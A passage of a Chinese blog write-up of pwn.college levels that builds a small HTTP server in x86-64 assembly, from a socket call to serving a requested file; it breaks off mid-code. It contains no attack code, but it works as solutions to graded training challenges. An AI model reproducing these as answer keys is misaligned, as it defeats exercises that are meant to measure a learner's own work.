数据报中。</li><li><strong><code>IPPROTO_RSVP</code> (46):</strong> 资源预留协议 (RSVP)。 用于保证多媒体应用程序的带宽。</li><li><strong><code>IPPROTO_GRE</code> (47):</strong> 通用路由封装 (GRE)。 允许将不同协议的数据包封装在 IP 数据报中。</li><li><strong><code>IPPROTO_AH</code> (51):</strong> 认证头 (AH)。 用于安全通信。</li></ul><p>那么最终的exp为：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-meta">.section</span> .text<br><span class="hljs-symbol">_start:</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">41</span>      # socket(AF_INET, SOCK_STREAM,IPPROTO_IP)=<span class="hljs-number">3</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">2</span># AF_INET(<span class="hljs-number">2</span>)<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-number">1</span># SOCK_STREAM(<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">0</span># IPPROTO_IP(<span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>,<span class="hljs-number">0</span>       # SYS_exit<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>,<span class="hljs-number">60</span><br>    <span class="hljs-keyword">syscall</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">.section</span> .data<br><br></code></pre></td></tr></table></figure><h4 id="level3-1"><a href="#level3-1" class="headerlink" title="level3"></a>level3</h4><p>实现bind，<code>bind(3, &#123;sa_family=AF_INET, sin_port=htons(&lt;bind_port&gt;), sin_addr=inet_addr(&quot;&lt;bind_address&gt;&quot;)&#125;, 16) = 0</code></p><p>bind原型：<code>int bind(int sockfd, const struct sockaddr addr, socklen_t addrlen)</code></p><p>好吧，我想不出来。看别人的wp，很好，用到了.data段定义这个结构体。然后端口是0x5000，是80的小端序</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-meta">.section</span> .text<br><span class="hljs-symbol">_start:</span>     <br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">2</span>      # socket(AF_INET, SOCK_STREAM,IPPROTO_IP)=<span class="hljs-number">3</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-number">1</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">41</span> <br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">3</span><br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rsi</span>, [<span class="hljs-built_in">rip</span>+socket_addr]<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">16</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">49</span><br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>,<span class="hljs-number">0</span>       # SYS_exit<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>,<span class="hljs-number">60</span><br>    <span class="hljs-keyword">syscall</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">.section</span> .data<br><span class="hljs-symbol">socket_addr:</span><br><span class="hljs-meta">    .2byte</span> <span class="hljs-number">2</span><br><span class="hljs-meta">    .2byte</span> <span class="hljs-number">0x5000</span><br><span class="hljs-meta">    .4byte</span> <span class="hljs-number">0</span><br><span class="hljs-meta">    .8byte</span> <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>绑定的地址为0.0.0.0即<code>bind(3, &#123;sa_family=AF_INET, sin_port=htons(80), sin_addr=inet_addr(&quot;0.0.0.0&quot;)&#125;, 16) = 0</code></p><h4 id="level4-1"><a href="#level4-1" class="headerlink" title="level4"></a>level4</h4><p>要完成<code>listen(3, 0) = 0</code>，这个简单啊，listen系统调用号为50</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-meta">.section</span> .text<br><span class="hljs-symbol">_start:</span>     <br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">2</span>      # socket(AF_INET, SOCK_STREAM,IPPROTO_IP)=<span class="hljs-number">3</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-number">1</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">41</span> <br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">3</span>      # bind(<span class="hljs-number">3</span>, &#123;sa_family=AF_INET, sin_port=htons(<span class="hljs-number">80</span>), sin_addr=inet_addr(<span class="hljs-string">&quot;0.0.0.0&quot;</span>)&#125;, <span class="hljs-number">16</span>) = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rsi</span>, [<span class="hljs-built_in">rip</span>+socket_addr]<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">16</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">49</span><br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">3</span>      # listen(<span class="hljs-number">3</span>, <span class="hljs-number">0</span>) = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">50</span><br>    <span class="hljs-keyword">syscall</span> <br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>,<span class="hljs-number">0</span>       # SYS_exit<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>,<span class="hljs-number">60</span><br>    <span class="hljs-keyword">syscall</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">.section</span> .data<br><span class="hljs-symbol">socket_addr:</span><br><span class="hljs-meta">    .2byte</span> <span class="hljs-number">2</span><br><span class="hljs-meta">    .2byte</span> <span class="hljs-number">0x5000</span><br><span class="hljs-meta">    .4byte</span> <span class="hljs-number">0</span><br><span class="hljs-meta">    .8byte</span> <span class="hljs-number">0</span><br><br></code></pre></td></tr></table></figure><h4 id="level5-1"><a href="#level5-1" class="headerlink" title="level5"></a>level5</h4><p>要完成<code>accept(3, NULL, NULL) = 4</code> accept的系统调用号为43</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-meta">.section</span> .text<br><span class="hljs-symbol">_start:</span>     <br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">2</span>      # socket(AF_INET, SOCK_STREAM,IPPROTO_IP)=<span class="hljs-number">3</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-number">1</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">41</span> <br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">3</span>      # bind(<span class="hljs-number">3</span>, &#123;sa_family=AF_INET, sin_port=htons(<span class="hljs-number">80</span>), sin_addr=inet_addr(<span class="hljs-string">&quot;0.0.0.0&quot;</span>)&#125;, <span class="hljs-number">16</span>) = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rsi</span>, [<span class="hljs-built_in">rip</span>+socket_addr]<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">16</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">49</span><br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">3</span>      # listen(<span class="hljs-number">3</span>, <span class="hljs-number">0</span>) = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">50</span><br>    <span class="hljs-keyword">syscall</span> <br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">3</span>      # accept(<span class="hljs-number">3</span>, NULL, NULL) = <span class="hljs-number">4</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">43</span><br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>,<span class="hljs-number">0</span>       # SYS_exit<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>,<span class="hljs-number">60</span><br>    <span class="hljs-keyword">syscall</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">.section</span> .data<br><span class="hljs-symbol">socket_addr:</span><br><span class="hljs-meta">    .2byte</span> <span class="hljs-number">2</span><br><span class="hljs-meta">    .2byte</span> <span class="hljs-number">0x5000</span><br><span class="hljs-meta">    .4byte</span> <span class="hljs-number">0</span><br><span class="hljs-meta">    .8byte</span> <span class="hljs-number">0</span><br><br></code></pre></td></tr></table></figure><h4 id="level6-1"><a href="#level6-1" class="headerlink" title="level6"></a>level6</h4><p>这一关有点东西，要完成三个东西：<code>read(4, &lt;read_request&gt;, &lt;read_request_count&gt;) = &lt;read_request_result&gt;</code>，<code>write(4, &quot;HTTP/1.0 200 OK\r\n\r\n&quot;, 19) = 19</code>和<code>close(4) = 0</code></p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-meta">.section</span> .text<br><span class="hljs-symbol">_start:</span>     <br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">2</span>      # socket(AF_INET, SOCK_STREAM,IPPROTO_IP)=<span class="hljs-number">3</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-number">1</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">41</span> <br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">3</span>      # bind(<span class="hljs-number">3</span>, &#123;sa_family=AF_INET, sin_port=htons(<span class="hljs-number">80</span>), sin_addr=inet_addr(<span class="hljs-string">&quot;0.0.0.0&quot;</span>)&#125;, <span class="hljs-number">16</span>) = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rsi</span>, [<span class="hljs-built_in">rip</span>+socket_addr]<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">16</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">49</span><br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">3</span>      # listen(<span class="hljs-number">3</span>, <span class="hljs-number">0</span>) = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">50</span><br>    <span class="hljs-keyword">syscall</span> <br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">3</span>      # accept(<span class="hljs-number">3</span>, NULL, NULL) = <span class="hljs-number">4</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">43</span><br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">4</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-built_in">rsp</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">256</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">4</span>      # write(<span class="hljs-number">4</span>, <span class="hljs-string">&quot;HTTP/1.0 200 OK\r\n\r\n&quot;</span>, <span class="hljs-number">19</span>) = <span class="hljs-number">19</span><br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rsi</span>,[<span class="hljs-built_in">rip</span> + ret_normal_msg] <br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">19</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">1</span><br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">4</span>      # close(<span class="hljs-number">4</span>) = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">3</span><br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>,<span class="hljs-number">0</span>       # SYS_exit<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>,<span class="hljs-number">60</span><br>    <span class="hljs-keyword">syscall</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">.section</span> .data<br><span class="hljs-symbol">socket_addr:</span><br><span class="hljs-meta">    .2byte</span> <span class="hljs-number">2</span><br><span class="hljs-meta">    .2byte</span> <span class="hljs-number">0x5000</span><br><span class="hljs-meta">    .4byte</span> <span class="hljs-number">0</span><br><span class="hljs-meta">    .8byte</span> <span class="hljs-number">0</span><br><span class="hljs-symbol">ret_normal_msg:</span><br><span class="hljs-meta">    .ascii</span> <span class="hljs-string">&quot;HTTP/1.0 200 OK\r\n\r\n&quot;</span><br><br></code></pre></td></tr></table></figure><p>这一关的目的是，能够接收客户端发送来的消息，并反馈200状态码。</p><h4 id="level7-1"><a href="#level7-1" class="headerlink" title="level7"></a>level7</h4><p>那么这一关，就响应客户端的请求，将它要的文件，发送给它。那么就有个问题了，第一个read会读取客户端发来的请求，然后这个请求很长，该怎么精准拿到这个文件呢？</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nix">read(<span class="hljs-number">4</span>, <span class="hljs-string">&quot;GET /tmp/tmpper_iarh HTTP/1.1<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Host: localhost<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>User-Agent: python-requests/2.32.3<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Accept-Encoding: gzip, deflate, zstd<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Accept: */*<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Connection: keep-alive<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>&quot;</span>, <span class="hljs-number">256</span>) <span class="hljs-operator">=</span> <span class="hljs-number">161</span><br></code></pre></td></tr></table></figure><img src="/2025/03/01/pwn-college-%E9%A2%98%E8%A7%A3/image-20241031112813128.png" class="" title="image-20241031112813128"><p>我发现了一个简单的方法用变量存起来就好了，然后截断第一个空格。</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-meta"></span><br><span class="hljs-meta"></span><br><span class="hljs-meta">.section</span> .text<br><span class="hljs-symbol">_start:</span>     <br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">2</span>      # socket(AF_INET, SOCK_STREAM,IPPROTO_IP)=<span class="hljs-number">3</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-number">1</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">41</span> <br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">3</span>      # bind(<span class="hljs-number">3</span>, &#123;sa_family=AF_INET, sin_port=htons(<span class="hljs-number">80</span>), sin_addr=inet_addr(<span class="hljs-string">&quot;0.0.0.0&quot;</span>)&#125;, <span class="hljs-number">16</span>) = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rsi</span>, [<span class="hljs-built_in">rip</span>+socket_addr]<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">16</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">49</span><br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">3</span>      # listen(<span class="hljs-number">3</span>, <span class="hljs-number">0</span>) = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">50</span><br>    <span class="hljs-keyword">syscall</span> <br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">3</span>      # accept(<span class="hljs-number">3</span>, NULL, NULL) = <span class="hljs-number">4</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">43</span><br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">4</span>      # read(<span class="hljs-number">4</span>,buf,count_bytes)<br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rsi</span>, buffer<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">256</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rsi</span>, buffer+<span class="hljs-number">4</span><br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rdi</span>, file_path<br><span class="hljs-symbol">loop_start:</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>, <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rsi</span>]<br>    <span class="hljs-keyword">cmp</span> <span class="hljs-built_in">al</span>, <span class="hljs-string">&#x27; &#x27;</span><br>    <span class="hljs-keyword">je</span> get_file_path<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rdi</span>], <span class="hljs-built_in">al</span><br>    <span class="hljs-keyword">inc</span> <span class="hljs-built_in">rdi</span><br>    <span class="hljs-keyword">inc</span> <span class="hljs-built_in">rsi</span><br>    <span class="hljs-keyword">jmp</span> loop_start<br><span class="hljs-symbol"></span><br><span class="hljs-symbol">get_file_path:</span><br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rdi</span>, file_path # open<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">2</span><br>    <span class="hljs-keyword">syscall</span><br>    <br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">5</span>              # read<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-built_in">rsp</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">256</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">syscall</span> <br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">rax</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rbx</span>, <span class="hljs-number">0</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">5</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">3</span><br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">4</span>      # write(<span class="hljs-number">4</span>, <span class="hljs-string">&quot;HTTP/1.0 200 OK\r\n\r\n&quot;</span>, <span class="hljs-number">19</span>) = <span class="hljs-number">19</span><br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rsi</span>,[<span class="hljs-built_in">rip</span> + ret_normal_msg] <br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">19</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">1</span><br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span 